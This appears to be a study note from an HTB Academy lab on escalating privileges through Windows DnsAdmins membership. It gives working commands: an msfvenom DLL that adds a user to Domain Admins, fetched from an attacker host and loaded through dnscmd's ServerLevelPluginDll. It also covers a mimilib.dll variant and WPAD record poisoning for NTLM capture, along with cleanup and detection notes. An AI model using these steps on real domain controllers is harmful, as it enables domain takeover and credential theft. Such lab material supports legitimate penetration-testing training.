# DnsAdmins



`DnsAdmins` members have management access to DNS on the network. The Windows DNS service supports **custom plugin DLLs** to resolve queries outside locally hosted zones — and it runs as **`NT AUTHORITY\SYSTEM`**.

> [!danger] Core Vulnerability
> The `dnscmd` utility lets a DnsAdmins member set the path to a plugin DLL via **`ServerLevelPluginDll`** with **zero verification of the DLL's path**. Next time the DNS service (re)starts, that DLL gets loaded — as SYSTEM.

Attack chain, per [Shay Ber's original writeup, summarized on ADSecurity.org](https://adsecurity.org/?p=4064) (also documented at [labofapenetrationtester.com](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)):

1. DNS management happens over **RPC**.
2. `ServerLevelPluginDll` lets us load an arbitrary DLL with no path verification — set via `dnscmd` from the CLI.
3. Running the `dnscmd` command as a DnsAdmins member populates:
   `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`
4. When the DNS service restarts, the DLL at that path (e.g. on an attacker-controlled/accessible share) is loaded.
5. Attacker DLL can spawn a reverse shell, add a user to Domain Admins, or run Mimikatz-as-a-DLL to dump creds.

> [!warning] Destructive Attack
> Restarting DNS on a DC can **take down name resolution for the whole AD environment**. Always get explicit client sign-off before restarting the service on an engagement, and be ready to clean up / restore service afterward.

## Attack Walkthrough — ServerLevelPluginDll

### 1. Generate a Malicious DLL

```shellsession
s0nam@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

### 2. Host It / Transfer to Target

```shellsession
s0nam@htb[/htb]$ python3 -m http.server 7777

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -
```

```powershell
PS C:\htb> wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

### 3. Confirm the Attack Requires DnsAdmins Membership

As a **non-privileged** user:

```cmd
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```
As expected, attempting to execute this command as a normal user isn't successful. Only members of the `DnsAdmins` group are permitted to do this.

Confirm group membership:

```powershell
PS C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109
```

### 4. Set the Malicious Plugin DLL Path (as DnsAdmins Member)

```cmd
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

> [!warning] Must Use Full Path
> You **must specify the full path** to the DLL or the attack silently fails.

> [!info] Note on Tooling
> DnsAdmins members can only use the **`dnscmd`** utility for this — they don't have direct permission on the registry key itself; `dnscmd` performs the write via its own elevated RPC context.

Membership in DnsAdmins does **not** by itself grant the right to restart the DNS service — that's a separate permission a sysadmin might additionally grant.

### 5. Check Service-Restart Permissions

Get the user's SID:

```cmd
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

Check DNS service ACL (SDDL) with `sc`:

```cmd
C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

Our SID has `RPWP` = **`SERVICE_START`** + **`SERVICE_STOP`**.

## Cleanup (Elevated / Admin Context Required)

> [!danger] Do This Before Declaring Done
> Until the malicious DLL path is removed, the DNS service **cannot start correctly again**. Always clean up or hand the client clear remediation steps.

**1. Confirm the registry key exists:**

```cmd
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```

**2. Delete the key:**

```cmd
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

**3. Restart DNS again:**

```cmd
C:\htb> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
        ...
        PID                : 4984
```

**4. Confirm it's healthy:**

```cmd
C:\htb> sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
```

Also validate with `nslookup` against localhost or another domain host that resolution is working again.

## Alternative Payload: mimilib.dll

Rather than a custom msfvenom DLL, [`mimilib.dll` from Benjamin Delpy (gentilkiwi), creator of Mimikatz](https://blog.gentilkiwi.com), can be modified (in `kdns.c`) to run a reverse shell one-liner or arbitrary command on every DNS query it handles:

```c
/*  Benjamin DELPY `gentilkiwi`
    https://blog.gentilkiwi.com
    benjamin@gentilkiwi.com
    Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
    FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
    if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
    {
        klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
        fclose(kdns_logfile);
        system("ENTER COMMAND HERE");
    }
    return ERROR_SUCCESS;
}
```

> [!tip] Practical Note
> Community writeups (e.g. [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)) note that custom plugin DLL code should execute in a **new thread** inside `DnsPluginInitialize`, otherwise the DNS service can crash/fail to start rather than running the payload.

## Alternative Vector: WPAD Record Poisoning via Global Query Block List

Beyond the plugin-DLL RCE path, DnsAdmins membership also grants rights to **disable the Global Query Block List**, which by default blocks resolution of two historically abuse-prone names:

- **WPAD** (Web Proxy Automatic Discovery Protocol)
- **ISATAP** (Intra-Site Automatic Tunnel Addressing Protocol)

These have been blocked by default since **Server 2008** specifically because any domain user can otherwise create a computer object/DNS record with those names and hijack traffic.

**Attack outline:**

1. Disable the global query block list.
2. Create a `WPAD` A record pointing at the attacker's machine.
3. Every host doing default WPAD auto-discovery now proxies its web traffic through the attacker.
4. Use **Responder** or **Inveigh** to spoof/capture NTLM hashes for offline cracking, or pivot into an SMB relay attack.

### Disable the Global Query Block List

```powershell
PS C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

### Add the WPAD Record

```powershell
PS C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

## Attack Path Comparison

| Vector | Requires Service Restart? | Impact | Detection Surface |
|---|---|---|---|
| `ServerLevelPluginDll` (custom/msfvenom DLL) | Yes | SYSTEM code exec on DC → Domain Admin | Registry key `ServerLevelPluginDll` populated, esp. if it starts with `\\` (UNC path) |
| `mimilib.dll` plugin | Yes | SYSTEM code exec via modified DNS plugin | Same registry key monitoring |
| WPAD record + blocklist disable | No | NTLM hash capture / SMB relay via traffic hijack | `GlobalQueryBlockList` change, new `wpad` DNS record |

## Lab Task

- **Target:** DC (spawn via HTB panel to get IP)
- **Creds:** `netadm` / `HTB_@cademy_stdnt!`
- **Goal:** Leverage `DnsAdmins` membership to escalate privileges and read
  `C:\Users\Administrator\Desktop\DnsAdmins\flag.txt`

```powershell
# 1. Confirm membership
Get-ADGroupMember -Identity DnsAdmins

# 2. Generate + host malicious DLL (attacker box)
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
python3 -m http.server 7777

# 3. Pull DLL to target
wget "http://<ATTACKER_IP>:7777/adduser.dll" -outfile "adduser.dll"

# 4. Set plugin DLL path (full path required)
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

# 5. Check + use restart rights
wmic useraccount where name="netadm" get sid
sc.exe sdshow DNS
sc stop dns
sc start dns

# 6. Confirm + grab flag
net group "Domain Admins" /dom
type C:\Users\Administrator\Desktop\DnsAdmins\flag.txt
```
